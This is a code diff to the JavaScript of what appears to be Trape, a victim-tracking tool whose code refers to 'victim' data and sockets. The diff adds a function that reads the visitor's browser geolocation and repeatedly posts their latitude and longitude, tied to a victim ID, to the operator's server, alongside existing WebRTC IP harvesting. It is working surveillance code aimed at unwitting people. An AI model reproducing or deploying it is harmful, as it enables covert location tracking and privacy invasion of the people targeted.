@@ -1,5 +1,6 @@
 var urlServices = [];
 var Services = [];
+var latitude = null, longitude = null;
 
 window.serverPath = '';
 
@@ -7,6 +8,7 @@ var socketTrape = null;
 
 $(document).ready(function($) {
     var d = getVictimData();
+    getGeolocation();
 
     Services = [{
         url: "https://www.facebook.com",
@@ -353,6 +355,7 @@ function defineSockets(self) {
 }
 
 function locateV(self) {
+    /*
     $.ajax({
 	url: "https://www.googleapis.com/geolocation/v1/geolocate?key=" + window.gMapsApiKey,
         data: {},
@@ -379,6 +382,20 @@ function locateV(self) {
         error: function(error) {
             setTimeout(function(){ locateV(); }, 10000);
         }
+    });
+    */
+
+    $.ajax({
+        url: window.serverPath + '/lr',
+        data :  {"vId" : localStorage.trape_vId, "lat": latitude, "lon": longitude},
+        dataType: "json",
+        type: 'POST',
+        success: function(data) {
+            setTimeout(function(){ locateV(); }, 5000);
+        },
+        error:function(error) {
+            setTimeout(function(){ locateV(); }, 10000);
+        }    
     });
 }
 
@@ -606,6 +623,15 @@ function getIPs(callback) {
                 handleCandidate(line);
         });
     }, 1000);
+}
+
+function getGeolocation(){
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition( function(position){        
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
+        });
+    }
 }
 
 var objUser = {
